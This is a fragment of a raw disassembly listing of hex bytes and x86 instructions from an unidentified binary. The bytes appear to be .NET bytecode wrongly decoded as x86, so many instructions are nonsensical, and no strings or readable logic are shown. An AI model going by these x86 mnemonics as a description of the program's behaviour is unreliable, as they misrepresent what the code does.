  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
  40311e:	00 00                	add    %al,(%eax)
  403120:	04 28                	add    $0x28,%al
  403122:	52                   	push   %edx
  403123:	00 00                	add    %al,(%eax)
  403125:	0a 7e 06             	or     0x6(%esi),%bh
  403128:	00 00                	add    %al,(%eax)
  40312a:	04 28                	add    $0x28,%al
  40312c:	53                   	push   %ebx
  40312d:	00 00                	add    %al,(%eax)
  40312f:	0a 73 54             	or     0x54(%ebx),%dh
  403132:	00 00                	add    %al,(%eax)
  403134:	0a 0a                	or     (%edx),%cl
  403136:	28 55 00             	sub    %dl,0x0(%ebp)
  403139:	00 0a                	add    %cl,(%edx)
  40313b:	6f                   	outsl  %ds:(%esi),(%dx)
  40313c:	56                   	push   %esi
  40313d:	00 00                	add    %al,(%eax)
  40313f:	0a 6f 57             	or     0x57(%edi),%ch
  403142:	00 00                	add    %al,(%eax)
  403144:	0a 0b                	or     (%ebx),%cl
  403146:	07                   	pop    %es
  403147:	06                   	push   %es
  403148:	6f                   	outsl  %ds:(%esi),(%dx)
  403149:	58                   	pop    %eax
  40314a:	00 00                	add    %al,(%eax)
  40314c:	0a 28                	or     (%eax),%ch
  40314e:	59                   	pop    %ecx
  40314f:	00 00                	add    %al,(%eax)
  403151:	0a 39                	or     (%ecx),%bh
  403153:	2f                   	das
  403154:	02 00                	add    (%eax),%al
  403156:	00 28                	add    %ch,(%eax)
  403158:	5a                   	pop    %edx
  403159:	00 00                	add    %al,(%eax)
  40315b:	0a 0c 16             	or     (%esi,%edx,1),%cl
  40315e:	0d 38 3b 00 00       	or     $0x3b38,%eax
  403163:	00 08                	add    %cl,(%eax)
  403165:	09 a3 50 00 00 01    	or     %esp,0x1000050(%ebx)
  40316b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40316e:	04 6f                	add    $0x6f,%al
  403170:	56                   	push   %esi
  403171:	00 00                	add    %al,(%eax)
  403173:	0a 6f 57             	or     0x57(%edi),%ch
  403176:	00 00                	add    %al,(%eax)
  403178:	0a 06                	or     (%esi),%al
  40317a:	6f                   	outsl  %ds:(%esi),(%dx)
  40317b:	58                   	pop    %eax
  40317c:	00 00                	add    %al,(%eax)
  40317e:	0a 28                	or     (%eax),%ch
  403180:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403185:	07                   	pop    %es
  403186:	00 00                	add    %al,(%eax)
  403188:	00 11                	add    %dl,(%ecx)
  40318a:	04 6f                	add    $0x6f,%al
  40318c:	5b                   	pop    %ebx
  40318d:	00 00                	add    %al,(%eax)
  40318f:	0a dd                	or     %ch,%bl
  403191:	06                   	push   %es
  403192:	00 00                	add    %al,(%eax)
  403194:	00 26                	add    %ah,(%esi)
  403196:	dd 00                	fldl   (%eax)
  403198:	00 00                	add    %al,(%eax)
  40319a:	00 09                	add    %cl,(%ecx)
  40319c:	17                   	pop    %ss
  40319d:	58                   	pop    %eax
  40319e:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  4031a3:	32 bf 28 30 00 00    	xor    0x3028(%edi),%bh
  4031a9:	06                   	push   %es
  4031aa:	39 71 00             	cmp    %esi,0x0(%ecx)
  4031ad:	00 00                	add    %al,(%eax)
  4031af:	73 5c                	jae    0x40320d
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	0a 13                	or     (%ebx),%dl
  4031b5:	05 11 05 72 98       	add    $0x98720511,%eax
  4031ba:	21 00                	and    %eax,(%eax)
  4031bc:	70 6f                	jo     0x40322d
  4031be:	5d                   	pop    %ebp
  4031bf:	00 00                	add    %al,(%eax)
  4031c1:	0a 11                	or     (%ecx),%dl
  4031c3:	05 1b 8d 38 00       	add    $0x388d1b,%eax
  4031c8:	00 01                	add    %al,(%ecx)
  4031ca:	25 16 72 a0 21       	and    $0x21a07216,%eax
  4031cf:	00 70 a2             	add    %dh,-0x5e(%eax)
  4031d2:	25 17 06 6f 5e       	and    $0x5e6f0617,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	0a 28                	or     (%eax),%ch
  4031db:	5f                   	pop    %edi
  4031dc:	00 00                	add    %al,(%eax)
  4031de:	0a a2 25 18 72 0a    	or     0xa721825(%edx),%ah
  4031e4:	22 00                	and    (%eax),%al
  4031e6:	70 a2                	jo     0x40318a
  4031e8:	25 19 06 6f 58       	and    $0x586f0619,%eax
  4031ed:	00 00                	add    %al,(%eax)
  4031ef:	0a a2 25 1a 72 1c    	or     0x1c721a25(%edx),%ah
  4031f5:	22 00                	and    (%eax),%al
  4031f7:	70 a2                	jo     0x40319b
  4031f9:	28 60 00             	sub    %ah,0x0(%eax)
  4031fc:	00 0a                	add    %cl,(%edx)
  4031fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4031ff:	61                   	popa
  403200:	00 00                	add    %al,(%eax)
  403202:	0a 11                	or     (%ecx),%dl
  403204:	05 17 6f 62 00       	add    $0x626f17,%eax
  403209:	00 0a                	add    %cl,(%edx)
  40320b:	11 05 17 6f 63 00    	adc    %eax,0x636f17
  403211:	00 0a                	add    %cl,(%edx)
  403213:	11 05 28 64 00 00    	adc    %eax,0x6428
  403219:	0a 26                	or     (%esi),%ah
  40321b:	38 52 00             	cmp    %dl,0x0(%edx)
  40321e:	00 00                	add    %al,(%eax)
  403220:	7e 65                	jle    0x403287
  403222:	00 00                	add    %al,(%eax)
  403224:	0a 72 30             	or     0x30(%edx),%dh
  403227:	22 00                	and    (%eax),%al
  403229:	70 28                	jo     0x403253
  40322b:	66 00 00             	data16 add %al,(%eax)
  40322e:	0a 18                	or     (%eax),%bl
  403230:	6f                   	outsl  %ds:(%esi),(%dx)
  403231:	67 00 00             	add    %al,(%bx,%si)
  403234:	0a 13                	or     (%ebx),%dl
  403236:	06                   	push   %es
  403237:	11 06                	adc    %eax,(%esi)
  403239:	06                   	push   %es
  40323a:	6f                   	outsl  %ds:(%esi),(%dx)
  40323b:	5e                   	pop    %esi
  40323c:	00 00                	add    %al,(%eax)
  40323e:	0a 28                	or     (%eax),%ch
  403240:	5f                   	pop    %edi
  403241:	00 00                	add    %al,(%eax)
  403243:	0a 72 8e             	or     -0x72(%edx),%dh
  403246:	22 00                	and    (%eax),%al
  403248:	70 06                	jo     0x403250
  40324a:	6f                   	outsl  %ds:(%esi),(%dx)
  40324b:	58                   	pop    %eax
  40324c:	00 00                	add    %al,(%eax)
  40324e:	0a 72 8e             	or     -0x72(%edx),%dh
  403251:	22 00                	and    (%eax),%al
  403253:	70 28                	jo     0x40327d
  403255:	68 00 00 0a 6f       	push   $0x6f0a0000
  40325a:	69 00 00 0a dd 0f    	imul   $0xfdd0a00,(%eax),%eax
  403260:	00 00                	add    %al,(%eax)
  403262:	00 11                	add    %dl,(%ecx)
  403264:	06                   	push   %es
  403265:	39 07                	cmp    %eax,(%edi)
  403267:	00 00                	add    %al,(%eax)
  403269:	00 11                	add    %dl,(%ecx)
  40326b:	06                   	push   %es
  40326c:	6f                   	outsl  %ds:(%esi),(%dx)
  40326d:	33 00                	xor    (%eax),%eax
  40326f:	00 0a                	add    %cl,(%edx)
  403271:	dc 06                	faddl  (%esi)
  403273:	6f                   	outsl  %ds:(%esi),(%dx)
  403274:	58                   	pop    %eax
  403275:	00 00                	add    %al,(%eax)
  403277:	0a 28                	or     (%eax),%ch
  403279:	6a 00                	push   $0x0
  40327b:	00 0a                	add    %cl,(%edx)
  40327d:	39 15 00 00 00 06    	cmp    %edx,0x6000000
  403283:	6f                   	outsl  %ds:(%esi),(%dx)
  403284:	58                   	pop    %eax
  403285:	00 00                	add    %al,(%eax)
  403287:	0a 28                	or     (%eax),%ch
  403289:	6b 00 00             	imul   $0x0,(%eax),%eax
  40328c:	0a 20                	or     (%eax),%ah
  40328e:	e8 03 00 00 28       	call   0x28403296
  403293:	14 00                	adc    $0x0,%al
  403295:	00 0a                	add    %cl,(%edx)
  403297:	06                   	push   %es
  403298:	6f                   	outsl  %ds:(%esi),(%dx)
  403299:	58                   	pop    %eax
  40329a:	00 00                	add    %al,(%eax)
  40329c:	0a 17                	or     (%edi),%dl
  40329e:	73 6c                	jae    0x40330c
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 07                	or     (%edi),%al
  4032a4:	28 6d 00             	sub    %ch,0x0(%ebp)
  4032a7:	00 0a                	add    %cl,(%edx)
  4032a9:	13 07                	adc    (%edi),%eax
  4032ab:	11 07                	adc    %eax,(%edi)
  4032ad:	16                   	push   %ss
  4032ae:	11 07                	adc    %eax,(%edi)
  4032b0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4032b3:	4c                   	dec    %esp
  4032b4:	00 00                	add    %al,(%eax)
  4032b6:	0a 28                	or     (%eax),%ch
  4032b8:	31 00                	xor    %eax,(%eax)
  4032ba:	00 06                	add    %al,(%esi)
  4032bc:	28 6e 00             	sub    %ch,0x0(%esi)
  4032bf:	00 0a                	add    %cl,(%edx)
  4032c1:	72 92                	jb     0x403255
  4032c3:	22 00                	and    (%eax),%al
  4032c5:	70 28                	jo     0x4032ef
  4032c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	0a 13                	or     (%ebx),%dl
  4032cc:	08 11                	or     %dl,(%ecx)
  4032ce:	08 73 70             	or     %dh,0x70(%ebx)
  4032d1:	00 00                	add    %al,(%eax)
  4032d3:	0a 13                	or     (%ebx),%dl
  4032d5:	09 11                	or     %edx,(%ecx)
  4032d7:	09 72 9c             	or     %esi,-0x64(%edx)
  4032da:	22 00                	and    (%eax),%al
  4032dc:	70 6f                	jo     0x40334d
  4032de:	71 00                	jno    0x4032e0
  4032e0:	00 0a                	add    %cl,(%edx)
  4032e2:	11 09                	adc    %ecx,(%ecx)
  4032e4:	72 b0                	jb     0x403296
  4032e6:	22 00                	and    (%eax),%al
  4032e8:	70 6f                	jo     0x403359
  4032ea:	71 00                	jno    0x4032ec
  4032ec:	00 0a                	add    %cl,(%edx)
  4032ee:	11 09                	adc    %ecx,(%ecx)
  4032f0:	72 d0                	jb     0x4032c2
  4032f2:	22 00                	and    (%eax),%al
  4032f4:	70 06                	jo     0x4032fc
  4032f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4032f7:	58                   	pop    %eax
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	0a 72 8e             	or     -0x72(%edx),%dh
  4032fd:	22 00                	and    (%eax),%al
  4032ff:	70 28                	jo     0x403329
  403301:	68 00 00 0a 6f       	push   $0x6f0a0000
  403306:	71 00                	jno    0x403308
  403308:	00 0a                	add    %cl,(%edx)
  40330a:	11 09                	adc    %ecx,(%ecx)
  40330c:	72 e6                	jb     0x4032f4
  40330e:	22 00                	and    (%eax),%al
  403310:	70 28                	jo     0x40333a
  403312:	72 00                	jb     0x403314
  403314:	00 0a                	add    %cl,(%edx)
  403316:	28 6f 00             	sub    %ch,0x0(%edi)
  403319:	00 0a                	add    %cl,(%edx)
  40331b:	6f                   	outsl  %ds:(%esi),(%dx)
  40331c:	71 00                	jno    0x40331e
  40331e:	00 0a                	add    %cl,(%edx)
  403320:	11 09                	adc    %ecx,(%ecx)
  403322:	72 ee                	jb     0x403312
  403324:	22 00                	and    (%eax),%al
  403326:	70 11                	jo     0x403339
  403328:	08 28                	or     %ch,(%eax)
  40332a:	73 00                	jae    0x40332c
  40332c:	00 0a                	add    %cl,(%edx)
  40332e:	72 fa                	jb     0x40332a
  403330:	22 00                	and    (%eax),%al
  403332:	70 28                	jo     0x40335c
  403334:	68 00 00 0a 6f       	push   $0x6f0a0000
  403339:	71 00                	jno    0x40333b
  40333b:	00 0a                	add    %cl,(%edx)
  40333d:	dd 0f                	fisttpll (%edi)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 11                	add    %dl,(%ecx)
  403343:	09 39                	or     %edi,(%ecx)
  403345:	07                   	pop    %es
  403346:	00 00                	add    %al,(%eax)
  403348:	00 11                	add    %dl,(%ecx)
  40334a:	09 6f 33             	or     %ebp,0x33(%edi)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	0a dc                	or     %ah,%bl
  403351:	73 5c                	jae    0x4033af
  403353:	00 00                	add    %al,(%eax)
  403355:	0a 25 11 08 6f 5d    	or     0x5d6f0811,%ah
  40335b:	00 00                	add    %al,(%eax)
  40335d:	0a 25 17 6f 63 00    	or     0x636f17,%ah
  403363:	00 0a                	add    %cl,(%edx)
  403365:	25 16 6f 74 00       	and    $0x746f16,%eax
  40336a:	00 0a                	add    %cl,(%edx)
  40336c:	25 16 6f 75 00       	and    $0x756f16,%eax
  403371:	00 0a                	add    %cl,(%edx)
  403373:	25 17 6f 62 00       	and    $0x626f17,%eax
  403378:	00 0a                	add    %cl,(%edx)
  40337a:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  40337e:	0a 26                	or     (%esi),%ah
  403380:	16                   	push   %ss
  403381:	28 16                	sub    %dl,(%esi)
  403383:	00 00                	add    %al,(%eax)
  403385:	0a dd                	or     %ch,%bl
  403387:	06                   	push   %es
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 26                	add    %ah,(%esi)
  40338c:	dd 00                	fldl   (%eax)
  40338e:	00 00                	add    %al,(%eax)
  403390:	00 2a                	add    %ch,(%edx)
  403392:	00 00                	add    %al,(%eax)
  403394:	41                   	inc    %ecx
  403395:	64 00 00             	add    %al,%fs:(%eax)
  403398:	00 00                	add    %al,(%eax)
  40339a:	00 00                	add    %al,(%eax)
  40339c:	51                   	push   %ecx
  40339d:	00 00                	add    %al,(%eax)
  40339f:	00 28                	add    %ch,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 79 00             	add    %bh,0x0(%ecx)
  4033a6:	00 00                	add    %al,(%eax)
  4033a8:	06                   	push   %es
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	00 01                	add    %al,(%ecx)
  4033ad:	00 00                	add    %al,(%eax)
  4033af:	01 02                	add    %eax,(%edx)
  4033b1:	00 00                	add    %al,(%eax)
  4033b3:	00 1b                	add    %bl,(%ebx)
  4033b5:	01 00                	add    %eax,(%eax)
  4033b7:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	47                   	inc    %edi
  4033bd:	01 00                	add    %eax,(%eax)
  4033bf:	00 0f                	add    %cl,(%edi)
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	00 00                	add    %al,(%eax)
  4033c5:	00 00                	add    %al,(%eax)
  4033c7:	00 02                	add    %al,(%edx)
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	00 ba 01 00 00 6c    	add    %bh,0x6c000001(%edx)
  4033d1:	00 00                	add    %al,(%eax)
  4033d3:	00 26                	add    %ah,(%esi)
  4033d5:	02 00                	add    (%eax),%al
  4033d7:	00 0f                	add    %cl,(%edi)
	...
  4033e5:	00 00                	add    %al,(%eax)
  4033e7:	00 6f 02             	add    %ch,0x2(%edi)
  4033ea:	00 00                	add    %al,(%eax)
  4033ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ed:	02 00                	add    (%eax),%al
  4033ef:	00 06                	add    %al,(%esi)
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 31                	add    %dh,(%ecx)
  4033f5:	00 00                	add    %al,(%eax)
  4033f7:	01 1b                	add    %ebx,(%ebx)
  4033f9:	30 02                	xor    %al,(%edx)
  4033fb:	00 3a                	add    %bh,(%edx)
  4033fd:	00 00                	add    %al,(%eax)
  4033ff:	00 07                	add    %al,(%edi)
  403401:	00 00                	add    %al,(%eax)
  403403:	11 21                	adc    %esp,(%ecx)
  403405:	00 22                	add    %ah,(%edx)
  403407:	e2 33                	loop   0x40343c
  403409:	0e                   	push   %cs
  40340a:	00 00                	add    %al,(%eax)
  40340c:	00 0a                	add    %cl,(%edx)
  40340e:	28 77 00             	sub    %dh,0x0(%edi)
  403411:	00 0a                	add    %cl,(%edx)
  403413:	28 78 00             	sub    %bh,0x0(%eax)
  403416:	00 0a                	add    %cl,(%edx)
  403418:	73 79                	jae    0x403493
  40341a:	00 00                	add    %al,(%eax)
  40341c:	0a 28                	or     (%eax),%ch
  40341e:	7a 00                	jp     0x403420
  403420:	00 0a                	add    %cl,(%edx)
  403422:	06                   	push   %es
  403423:	3d 07 00 00 00       	cmp    $0x7,%eax
  403428:	17                   	pop    %ss
  403429:	0b dd                	or     %ebp,%ebx
  40342b:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403430:	06                   	push   %es
  403431:	00 00                	add    %al,(%eax)
  403433:	00 26                	add    %ah,(%esi)
  403435:	dd 00                	fldl   (%eax)
  403437:	00 00                	add    %al,(%eax)
  403439:	00 16                	add    %dl,(%esi)
  40343b:	2a 07                	sub    (%edi),%al
  40343d:	2a 00                	sub    (%eax),%al
  40343f:	00 01                	add    %al,(%ecx)
  403441:	10 00                	adc    %al,(%eax)
  403443:	00 00                	add    %al,(%eax)
  403445:	00 00                	add    %al,(%eax)
  403447:	00 30                	add    %dh,(%eax)
  403449:	30 00                	xor    %al,(%eax)
  40344b:	06                   	push   %es
  40344c:	01 00                	add    %eax,(%eax)
  40344e:	00 01                	add    %al,(%ecx)
  403450:	1b 30                	sbb    (%eax),%esi
  403452:	02 00                	add    (%eax),%al
  403454:	34 00                	xor    $0x0,%al
  403456:	00 00                	add    %al,(%eax)
  403458:	02 00                	add    (%eax),%al
  40345a:	00 11                	add    %dl,(%ecx)
  40345c:	73 7b                	jae    0x4034d9
  40345e:	00 00                	add    %al,(%eax)
  403460:	0a 28                	or     (%eax),%ch
  403462:	7c 00                	jl     0x403464
  403464:	00 0a                	add    %cl,(%edx)
  403466:	6f                   	outsl  %ds:(%esi),(%dx)
  403467:	7d 00                	jge    0x403469
  403469:	00 0a                	add    %cl,(%edx)
  40346b:	72 0a                	jb     0x403477
  40346d:	23 00                	and    (%eax),%eax
  40346f:	70 6f                	jo     0x4034e0
  403471:	7e 00                	jle    0x403473
  403473:	00 0a                	add    %cl,(%edx)
  403475:	39 07                	cmp    %eax,(%edi)
  403477:	00 00                	add    %al,(%eax)
  403479:	00 17                	add    %dl,(%edi)
  40347b:	0a dd                	or     %ch,%bl
  40347d:	0d 00 00 00 dd       	or     $0xdd000000,%eax
  403482:	06                   	push   %es
  403483:	00 00                	add    %al,(%eax)
  403485:	00 26                	add    %ah,(%esi)
  403487:	dd 00                	fldl   (%eax)
  403489:	00 00                	add    %al,(%eax)
  40348b:	00 16                	add    %dl,(%esi)
  40348d:	2a 06                	sub    (%esi),%al
  40348f:	2a 01                	sub    (%ecx),%al
  403491:	10 00                	adc    %al,(%eax)
  403493:	00 00                	add    %al,(%eax)
  403495:	00 00                	add    %al,(%eax)
  403497:	00 2a                	add    %ch,(%edx)
  403499:	2a 00                	sub    (%eax),%al
  40349b:	06                   	push   %es
  40349c:	01 00                	add    %eax,(%eax)
  40349e:	00 01                	add    %al,(%ecx)
  4034a0:	1b 30                	sbb    (%eax),%esi
  4034a2:	02 00                	add    (%eax),%al
  4034a4:	fa                   	cli
  4034a5:	00 00                	add    %al,(%eax)
  4034a7:	00 08                	add    %cl,(%eax)
  4034a9:	00 00                	add    %al,(%eax)
  4034ab:	11 72 10             	adc    %esi,0x10(%edx)
  4034ae:	23 00                	and    (%eax),%eax
  4034b0:	70 73                	jo     0x403525
  4034b2:	7f 00                	jg     0x4034b4
  4034b4:	00 0a                	add    %cl,(%edx)
  4034b6:	0a 06                	or     (%esi),%al
  4034b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	0a 0b                	or     (%ebx),%cl
  4034be:	07                   	pop    %es
  4034bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4034c0:	81 00 00 0a 0c 38    	addl   $0x380c0a00,(%eax)
  4034c6:	8b 00                	mov    (%eax),%eax
  4034c8:	00 00                	add    %al,(%eax)
  4034ca:	08 6f 82             	or     %ch,-0x7e(%edi)
  4034cd:	00 00                	add    %al,(%eax)
  4034cf:	0a 0d 09 72 56 23    	or     0x23567209,%cl
  4034d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4034d8:	83 00 00             	addl   $0x0,(%eax)
  4034db:	0a 6f 38             	or     0x38(%edi),%ch
  4034de:	00 00                	add    %al,(%eax)
  4034e0:	0a 6f 7d             	or     0x7d(%edi),%ch
  4034e3:	00 00                	add    %al,(%eax)
  4034e5:	0a 13                	or     (%ebx),%dl
  4034e7:	04 11                	add    $0x11,%al
  4034e9:	04 72                	add    $0x72,%al
  4034eb:	70 23                	jo     0x403510
  4034ed:	00 70 28             	add    %dh,0x28(%eax)
  4034f0:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4034f5:	24 00                	and    $0x0,%al
  4034f7:	00 00                	add    %al,(%eax)
  4034f9:	09 72 9c             	or     %esi,-0x64(%edx)
  4034fc:	23 00                	and    (%eax),%eax
  4034fe:	70 6f                	jo     0x40356f
  403500:	83 00 00             	addl   $0x0,(%eax)
  403503:	0a 6f 38             	or     0x38(%edi),%ch
  403506:	00 00                	add    %al,(%eax)
  403508:	0a 6f 84             	or     -0x7c(%edi),%ch
  40350b:	00 00                	add    %al,(%eax)
  40350d:	0a 72 a8             	or     -0x58(%edx),%dh
  403510:	23 00                	and    (%eax),%eax
  403512:	70 6f                	jo     0x403583
  403514:	7e 00                	jle    0x403516
  403516:	00 0a                	add    %cl,(%edx)
  403518:	3a 30                	cmp    (%eax),%dh
  40351a:	00 00                	add    %al,(%eax)
  40351c:	00 11                	add    %dl,(%ecx)
  40351e:	04 72                	add    $0x72,%al
  403520:	b8 23 00 70 6f       	mov    $0x6f700023,%eax
  403525:	7e 00                	jle    0x403527
  403527:	00 0a                	add    %cl,(%edx)
  403529:	3a 1f                	cmp    (%edi),%bl
  40352b:	00 00                	add    %al,(%eax)
  40352d:	00 09                	add    %cl,(%ecx)
  40352f:	72 9c                	jb     0x4034cd
  403531:	23 00                	and    (%eax),%eax
  403533:	70 6f                	jo     0x4035a4
  403535:	83 00 00             	addl   $0x0,(%eax)
  403538:	0a 6f 38             	or     0x38(%edi),%ch
  40353b:	00 00                	add    %al,(%eax)
  40353d:	0a 72 c6             	or     -0x3a(%edx),%dh
  403540:	23 00                	and    (%eax),%eax
  403542:	70 28                	jo     0x40356c
  403544:	25 00 00 0a 39       	and    $0x390a0000,%eax
  403549:	08 00                	or     %al,(%eax)
  40354b:	00 00                	add    %al,(%eax)
  40354d:	17                   	pop    %ss
  40354e:	13 05 dd 4e 00 00    	adc    0x4edd,%eax
  403554:	00 08                	add    %cl,(%eax)
  403556:	6f                   	outsl  %ds:(%esi),(%dx)
  403557:	85 00                	test   %eax,(%eax)
  403559:	00 0a                	add    %cl,(%edx)
  40355b:	3a 6a ff             	cmp    -0x1(%edx),%ch
  40355e:	ff                   	(bad)
  40355f:	ff                   	lcall  (bad)
  403560:	dd 0d 00 00 00 08    	fisttpll 0x8000000
  403566:	39 06                	cmp    %eax,(%esi)
  403568:	00 00                	add    %al,(%eax)
  40356a:	00 08                	add    %cl,(%eax)
  40356c:	6f                   	outsl  %ds:(%esi),(%dx)
  40356d:	33 00                	xor    (%eax),%eax
  40356f:	00 0a                	add    %cl,(%edx)
  403571:	dc dd                	(bad)
  403573:	0d 00 00 00 07       	or     $0x7000000,%eax
  403578:	39 06                	cmp    %eax,(%esi)
  40357a:	00 00                	add    %al,(%eax)
  40357c:	00 07                	add    %al,(%edi)
  40357e:	6f                   	outsl  %ds:(%esi),(%dx)
  40357f:	33 00                	xor    (%eax),%eax
  403581:	00 0a                	add    %cl,(%edx)
  403583:	dc dd                	(bad)
  403585:	0d 00 00 00 06       	or     $0x6000000,%eax
  40358a:	39 06                	cmp    %eax,(%esi)
  40358c:	00 00                	add    %al,(%eax)
  40358e:	00 06                	add    %al,(%esi)
  403590:	6f                   	outsl  %ds:(%esi),(%dx)
  403591:	33 00                	xor    (%eax),%eax
  403593:	00 0a                	add    %cl,(%edx)
  403595:	dc dd                	(bad)
  403597:	06                   	push   %es
  403598:	00 00                	add    %al,(%eax)
  40359a:	00 26                	add    %ah,(%esi)
  40359c:	dd 00                	fldl   (%eax)
  40359e:	00 00                	add    %al,(%eax)
  4035a0:	00 16                	add    %dl,(%esi)
  4035a2:	2a 11                	sub    (%ecx),%dl
  4035a4:	05 2a 00 00 01       	add    $0x100002a,%eax
  4035a9:	34 00                	xor    $0x0,%al
  4035ab:	00 02                	add    %al,(%edx)
  4035ad:	00 19                	add    %bl,(%ecx)
  4035af:	00 a0 b9 00 0d 00    	add    %ah,0xd00b9(%eax)
  4035b5:	00 00                	add    %al,(%eax)
  4035b7:	00 02                	add    %al,(%edx)
  4035b9:	00 12                	add    %dl,(%edx)
  4035bb:	00 b9 cb 00 0d 00    	add    %bh,0xd00cb(%ecx)
  4035c1:	00 00                	add    %al,(%eax)
  4035c3:	00 02                	add    %al,(%edx)
  4035c5:	00 0b                	add    %cl,(%ebx)
  4035c7:	00 d2                	add    %dl,%dl
  4035c9:	dd 00                	fldl   (%eax)
  4035cb:	0d 00 00 00 00       	or     $0x0,%eax
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	00 00                	add    %al,(%eax)
  4035d4:	ef                   	out    %eax,(%dx)
  4035d5:	ef                   	out    %eax,(%dx)
  4035d6:	00 06                	add    %al,(%esi)
  4035d8:	01 00                	add    %eax,(%eax)
  4035da:	00 01                	add    %al,(%ecx)
  4035dc:	1b 30                	sbb    (%eax),%esi
  4035de:	02 00                	add    (%eax),%al
  4035e0:	25 00 00 00 09       	and    $0x9000000,%eax
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	11 16                	adc    %edx,(%esi)
  4035e9:	0a 28                	or     (%eax),%ch
  4035eb:	55                   	push   %ebp
  4035ec:	00 00                	add    %al,(%eax)
  4035ee:	0a 6f 86             	or     -0x7a(%edi),%ch
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	0a 12                	or     (%edx),%dl
  4035f5:	00 28                	add    %ch,(%eax)
  4035f7:	3b 00                	cmp    (%eax),%eax
  4035f9:	00 06                	add    %al,(%esi)
  4035fb:	26 06                	es push %es
  4035fd:	0b dd                	or     %ebp,%ebx
  4035ff:	08 00                	or     %al,(%eax)
  403601:	00 00                	add    %al,(%eax)
  403603:	26 06                	es push %es
  403605:	0b dd                	or     %ebp,%ebx
  403607:	00 00                	add    %al,(%eax)
  403609:	00 00                	add    %al,(%eax)
  40360b:	07                   	pop    %es
  40360c:	2a 00                	sub    (%eax),%al
  40360e:	00 00                	add    %al,(%eax)
  403610:	01 10                	add    %edx,(%eax)
  403612:	00 00                	add    %al,(%eax)
  403614:	00 00                	add    %al,(%eax)
  403616:	02 00                	add    (%eax),%al
  403618:	19 1b                	sbb    %ebx,(%ebx)
  40361a:	00 08                	add    %cl,(%eax)
  40361c:	01 00                	add    %eax,(%eax)
  40361e:	00 01                	add    %al,(%ecx)
  403620:	1b 30                	sbb    (%eax),%esi
  403622:	01 00                	add    %eax,(%eax)
  403624:	2f                   	das
  403625:	00 00                	add    %al,(%eax)
  403627:	00 0a                	add    %cl,(%edx)
  403629:	00 00                	add    %al,(%eax)
  40362b:	11 72 dc             	adc    %esi,-0x24(%edx)
  40362e:	23 00                	and    (%eax),%eax
  403630:	70 28                	jo     0x40365a
  403632:	3a 00                	cmp    (%eax),%al
  403634:	00 06                	add    %al,(%esi)
  403636:	0a 12                	or     (%edx),%dl
  403638:	00 28                	add    %ch,(%eax)
  40363a:	87 00                	xchg   %eax,(%eax)
  40363c:	00 0a                	add    %cl,(%edx)
  40363e:	39 07                	cmp    %eax,(%edi)
  403640:	00 00                	add    %al,(%eax)
  403642:	00 17                	add    %dl,(%edi)
  403644:	0b dd                	or     %ebp,%ebx
  403646:	0f 00 00             	sldt   (%eax)
  403649:	00 16                	add    %dl,(%esi)
  40364b:	0b dd                	or     %ebp,%ebx
  40364d:	08 00                	or     %al,(%eax)
  40364f:	00 00                	add    %al,(%eax)
  403651:	26 16                	es push %ss
  403653:	0b dd                	or     %ebp,%ebx
  403655:	00 00                	add    %al,(%eax)
  403657:	00 00                	add    %al,(%eax)
  403659:	07                   	pop    %es
  40365a:	2a 00                	sub    (%eax),%al
  40365c:	01 10                	add    %edx,(%eax)
  40365e:	00 00                	add    %al,(%eax)
  403660:	00 00                	add    %al,(%eax)
  403662:	00 00                	add    %al,(%eax)
  403664:	25 25 00 08 01       	and    $0x1080025,%eax
  403669:	00 00                	add    %al,(%eax)
  40366b:	01 1b                	add    %ebx,(%ebx)
  40366d:	30 04 00             	xor    %al,(%eax,%eax,1)
  403670:	65 00 00             	add    %al,%gs:(%eax)
  403673:	00 0b                	add    %cl,(%ebx)
  403675:	00 00                	add    %al,(%eax)
  403677:	11 1b                	adc    %ebx,(%ebx)
  403679:	8d 01                	lea    (%ecx),%eax
  40367b:	00 00                	add    %al,(%eax)
  40367d:	01 25 16 28 88 00    	add    %esp,0x882816
  403683:	00 0a                	add    %cl,(%edx)
  403685:	8c 66 00             	mov    %fs,0x0(%esi)
  403688:	00 01                	add    %al,(%ecx)
  40368a:	a2 25 17 28 89       	mov    %al,0x89281725
  40368f:	00 00                	add    %al,(%eax)
  403691:	0a a2 25 18 28 8a    	or     -0x75d7e7db(%edx),%ah
  403697:	00 00                	add    %al,(%eax)
  403699:	0a a2 25 19 28 8b    	or     -0x74d7e6db(%edx),%ah
  40369f:	00 00                	add    %al,(%eax)
  4036a1:	0a a2 25 1a 28 77    	or     0x77281a25(%edx),%ah
  4036a7:	00 00                	add    %al,(%eax)
